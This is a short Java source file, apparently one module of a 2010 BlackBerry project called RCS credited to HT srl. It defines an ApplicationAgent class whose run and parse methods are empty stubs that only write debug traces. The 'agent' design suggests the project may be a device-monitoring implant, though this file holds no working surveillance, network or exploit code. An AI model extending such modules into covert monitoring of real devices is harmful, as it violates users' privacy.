/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ApplicationAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ApplicationAgent extends Agent {
    //#mdebug
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);

    //#enddebug

    public ApplicationAgent(boolean agentStatus) {
        super(Agent.AGENT_APPLICATION, agentStatus, true, "ApplicationAgent");
    }

    protected ApplicationAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

    }

    protected boolean parse(byte[] confParameters) {
        // #debug
        debug.trace("parse");
        return false;
    }

}
